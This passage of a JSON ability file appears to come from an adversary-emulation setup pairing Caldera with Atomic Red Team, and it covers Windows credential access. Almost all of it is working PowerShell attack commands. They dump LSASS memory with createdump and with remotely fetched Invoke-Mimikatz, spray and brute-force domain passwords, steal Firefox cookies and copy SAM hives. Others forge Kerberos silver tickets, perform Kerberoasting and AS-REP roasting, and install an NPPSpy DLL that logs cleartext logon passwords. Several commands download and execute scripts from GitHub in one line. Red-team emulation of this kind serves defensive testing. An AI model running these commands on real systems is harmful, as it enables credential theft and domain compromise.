                    "command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) { ; } else {Write-Host -NoNewLine \"Reading Users.\"; $netOutput = net users /domain; $netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)]); $userLimit = 200; $usercount = 0; foreach ($line in $netOutput) {;   if($usercount -ge $userLimit){break};   $line = $line.trim();   $line = $line -split '\\s\\s+';   foreach ($user in $line){;     if($usercount -ge $userLimit){break};     Add-Content $env:Temp\\usersdpsLight.txt $user;     $usercount = $usercount + 1;     }  ; }; Write-Host \"Usernames saved to $env:Temp\\usersdpsLight.txt\"};  ;  function Invoke-dpsLight ($Password, $userlist) {; $users = Get-Content $userlist; $Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName; foreach ($User in $users) {;   $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password);   if ($Domain_check.name -ne $null) {;     Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\";   };   else { Write-Host \". \" -NoNewline}; }; Write-Host -ForegroundColor green \"Finished\"; }; Invoke-dpsLight \"Spring2020\" $env:Temp\\usersdpsLight.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "279d24eeb12b40e4547945accf59ca62",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "279d24eeb12b40e4547945accf59ca62"
    },
    "T1539__credential-access__Steal Web Session Cookie__d54bcaf2e58f6d95da2a54dcb5853a57": {
        "description": "This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. \nNote: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1539",
            "name": "Steal Web Session Cookie"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "remove-item PathToAtomicsFolder\\..\\ExternalPayloads\\T1539FirefoxCookies.txt -erroraction silentlycontinue",
                    "command": "stop-process -name \"firefox\" -force -erroraction silentlycontinue; $CookieDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite\"; \"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];\" | cmd /c PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe \"$CookieDBLocation\" | out-file -filepath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1539FirefoxCookies.txt\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d54bcaf2e58f6d95da2a54dcb5853a57",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d54bcaf2e58f6d95da2a54dcb5853a57"
    },
    "T1003.001__credential-access__OS Credential Dumping: LSASS Memory__8e01631039faf6a9a84df376bf9ad0f1": {
        "description": "Use createdump executable from .NET to create an LSASS dump.\n\n[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:Temp\\dotnet-lsass.dmp -ErrorAction Ignore",
                    "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"; & \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8e01631039faf6a9a84df376bf9ad0f1",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "8e01631039faf6a9a84df376bf9ad0f1"
    },
    "T1555__credential-access__Credentials from Password Stores__f6867f2b9b1b3c2eb733ad7ce7438f04": {
        "description": "Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555",
            "name": "Credentials from Password Stores"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); decryptteamviewer -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f6867f2b9b1b3c2eb733ad7ce7438f04",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f6867f2b9b1b3c2eb733ad7ce7438f04"
    },
    "T1558.003__credential-access__Steal or Forge Kerberos Tickets: Kerberoasting__2f03250355bb1403dcfac6808782a192": {
        "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the domain in question.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.003",
            "name": "Steal or Forge Kerberos Tickets: Kerberoasting"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Add-Type -AssemblyName System.IdentityModel  ; setspn.exe -T %USERDNSDOMAIN% -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2f03250355bb1403dcfac6808782a192",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2f03250355bb1403dcfac6808782a192"
    },
    "T1555__credential-access__Credentials from Password Stores__2c6e39a39ebf794d74417a7b1291463b": {
        "description": "The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. \nEach software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). \nThis tool has been developed for the purpose of finding these passwords for the most commonly-used software",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555",
            "name": "Credentials from Password Stores"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); lazagnemodule -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2c6e39a39ebf794d74417a7b1291463b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2c6e39a39ebf794d74417a7b1291463b"
    },
    "T1187__credential-access__Forced Authentication__6b8a391237b7169d02dd6538f8290345": {
        "description": "PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1187",
            "name": "Forced Authentication"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1'); Invoke-Internalmonologue -command \"-Downgrade true -impersonate true -restore true\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6b8a391237b7169d02dd6538f8290345",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6b8a391237b7169d02dd6538f8290345"
    },
    "T1552.001__credential-access__Unsecured Credentials: Credentials In Files__f2d48f9efed23e058bfe0f46d93d07a2": {
        "description": "Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.001",
            "name": "Unsecured Credentials: Credentials In Files"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); powershellsensitive -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f2d48f9efed23e058bfe0f46d93d07a2",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f2d48f9efed23e058bfe0f46d93d07a2"
    },
    "T1558.004__credential-access__Steal or Forge Kerberos Tickets: AS-REP Roasting__358926f4adef63bf95d152e35df4dab3": {
        "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.004",
            "name": "Steal or Forge Kerberos Tickets: AS-REP Roasting"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt\" -ErrorAction Ignore",
                    "command": "cmd.exe /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" asreproast /outfile:\"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "358926f4adef63bf95d152e35df4dab3",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "358926f4adef63bf95d152e35df4dab3"
    },
    "T1003.001__credential-access__OS Credential Dumping: LSASS Memory__82dcefb5c3512d73bf2248cb0127c4ae": {
        "description": "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\\"access denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "82dcefb5c3512d73bf2248cb0127c4ae",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "82dcefb5c3512d73bf2248cb0127c4ae"
    },
    "T1110.003__credential-access__Brute Force: Password Spraying__a59dbd1a2ac17d69455248e7d91231bc": {
        "description": "Attempt to brute force all Active Directory domain users with a single password (called \"password spraying\") on a domain controller, via LDAP, with NTLM or Kerberos\n\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.003",
            "name": "Brute Force: Password Spraying"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {;   Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\";   exit 1; }; $DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName; [System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null; $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389); $DomainUsers | Foreach-Object {;   $user = $_;   $password = 'P@ssw0rd!';   $credz = new-object System.Net.NetworkCredential($user, $password, \"$env:UserDnsDomain\");   $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM);   try {;     Write-Host \" [-] Attempting ${password} on account ${user}.\";     $conn.bind();     Write-Host \" [!] ${user}:${password} are valid credentials!\";   } catch {;     Write-Host $_.Exception.Message;   }; }; Write-Host \"End of password spraying\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a59dbd1a2ac17d69455248e7d91231bc",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "a59dbd1a2ac17d69455248e7d91231bc"
    },
    "T1003.002__credential-access__OS Credential Dumping: Security Account Manager__69219b448ba0a75bae573d58d8b6cf40": {
        "description": "Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.002",
            "name": "OS Credential Dumping: Security Account Manager"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "1..10 | % {;   rm \"$env:TEMP\\SAMvss$_\" -ErrorAction Ignore; }",
                    "command": "1..10 | % { ;  try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM\" , \"$env:TEMP\\SAMvss$_\", \"true\") } catch {};  ls \"$env:TEMP\\SAMvss$_\" -ErrorAction Ignore; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "69219b448ba0a75bae573d58d8b6cf40",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "69219b448ba0a75bae573d58d8b6cf40"
    },
    "T1555__credential-access__Credentials from Password Stores__9d0478981edda6091f911a1305025bde": {
        "description": "This module will extract the credentials from Windows Credential Manager",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555",
            "name": "Credentials from Password Stores"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9d0478981edda6091f911a1305025bde",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9d0478981edda6091f911a1305025bde"
    },
    "T1552.001__credential-access__Unsecured Credentials: Credentials In Files__9c2f9c808a72b05686236a63e1da93c8": {
        "description": "Search for Passwords on this system using passhunt via WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.001",
            "name": "Unsecured Credentials: Credentials In Files"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "rm -force .\\passhunt.exe -ErrorAction Ignore; rm -force .\\phunter* -ErrorAction Ignore; rm -force -recurse .\\DomainRecon -ErrorAction Ignore; rm -force -recurse .\\Exploitation -ErrorAction Ignore; rm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore; rm -force -recurse .\\LocalRecon -ErrorAction Ignore; rm -force -recurse .\\Vulnerabilities -ErrorAction Ignore",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); passhunt -local $true -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9c2f9c808a72b05686236a63e1da93c8",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9c2f9c808a72b05686236a63e1da93c8"
    },
    "T1555__credential-access__Credentials from Password Stores__d74777514cba5a4fd4f297261ed0d8ef": {
        "description": "This module will extract the credentials from Windows Credential Manager",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555",
            "name": "Credentials from Password Stores"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d74777514cba5a4fd4f297261ed0d8ef",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d74777514cba5a4fd4f297261ed0d8ef"
    },
    "T1558.002__credential-access__Steal or Forge Kerberos Tickets: Silver Ticket__8bdb353bbee5378745783ff6f2d49cb0": {
        "description": "Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.002",
            "name": "Steal or Forge Kerberos Tickets: Silver Ticket"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore; $domain_sid = \"S-1-5-21-DEFAULT\"; If ($domain_sid -Match \"DEFAULT\") {;   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @\"; >%TEMP%\\silver.txt 2>&1 (;   echo Purge existing tickets and create silver ticket:;   klist purge;   PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\\\=%.%userdnsdomain% /ptt\" \"exit\";   echo.;   echo executing:schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   ;   echo.;   echo Tickets after requesting schtasks:;   klist;   echo.;   echo End of Silver Ticket attack; ); \"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Silver Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\silver.txt; Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8bdb353bbee5378745783ff6f2d49cb0",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "8bdb353bbee5378745783ff6f2d49cb0"
    },
    "T1003__credential-access__OS Credential Dumping__24a6ff3816824ecae285f847995709cf": {
        "description": "Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.\nAfter user's logging in cleartext password is saved in C:\\NPPSpy.txt.\nClean up deletes the files and reverses Registry changes.\nNPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003",
            "name": "OS Credential Dumping"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$cleanupPath = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER; $cleanupUpdatedValue = $cleanupPath.PROVIDERORDER ; $cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''; Set-ItemProperty -Path $cleanupPath.PSPath -Name \"PROVIDERORDER\" -Value $cleanupUpdatedValue; Remove-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\" -Recurse -ErrorAction Ignore; Remove-Item C:\\NPPSpy.txt -ErrorAction Ignore; Remove-Item C:\\Windows\\System32\\NPPSpy.dll -ErrorAction Ignore",
                    "command": "Copy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\"; $path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER; $UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\"; Set-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue; $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore; $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Name\" -Value NPPSpy -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\NPPSPY.dll\" -ErrorAction Ignore; echo \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "24a6ff3816824ecae285f847995709cf",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "24a6ff3816824ecae285f847995709cf"
    },
    "T1003__credential-access__OS Credential Dumping__f6c693da77b8824b3c52ba3b6ca0bf88": {
        "description": "AppCmd.exe is a command line utility which is used for managing an IIS web server. The list command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.\n[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003",
            "name": "OS Credential Dumping"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:*; C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:*; C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f6c693da77b8824b3c52ba3b6ca0bf88",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f6c693da77b8824b3c52ba3b6ca0bf88"
    },
    "T1649__credential-access__Steal or Forge Authentication Certificates__b41910e3770cff37dd642650f0d91672": {
        "description": "Export all user certificates and add to a compressed archive.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1649",
            "name": "Steal or Forge Authentication Certificates"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$exfilpath=\"$env:PUBLIC\\T1649\\certs\"; Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore",
                    "command": "$archive=\"$env:PUBLIC\\T1649\\atomic_certs.zip\"; $exfilpath=\"$env:PUBLIC\\T1649\\certs\"; Add-Type -assembly \"system.io.compression.filesystem\"; Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore; mkdir $exfilpath | Out-Null; foreach ($cert in (gci Cert:\\CurrentUser\\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\\$($cert.FriendlyName).cer}; [io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b41910e3770cff37dd642650f0d91672",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b41910e3770cff37dd642650f0d91672"
    },
    "T1552.004__credential-access__Unsecured Credentials: Private Keys__000549902a51ef21f57d3d28a6e5ecc0": {
        "description": "The following Atomic test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\nReference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.004",
            "name": "Unsecured Credentials: Private Keys"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item",
                    "command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) ; certutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\\temp\\atomic.pfx",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "000549902a51ef21f57d3d28a6e5ecc0",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "000549902a51ef21f57d3d28a6e5ecc0"
    },
    "T1110.001__credential-access__Brute Force: Password Guessing__77e4fd90d211edf046c6c7092a4ed3af": {
        "description": "Bruteforce a single user's password from a wordlist\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.001",
            "name": "Brute Force: Password Guessing"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"; .\\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\\bruteuser.txt TestUser1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "77e4fd90d211edf046c6c7092a4ed3af",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "77e4fd90d211edf046c6c7092a4ed3af"
    },
    "T1555.003__credential-access__Credentials from Password Stores: Credentials from Web Browsers__679ef375ad2b361965500392419d084c": {
        "description": "Simulates an adversary accessing encrypted credentials from firefox web browser's login database.\nmore info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data\n",
        "tactic": "credential-access",
        "technique": {
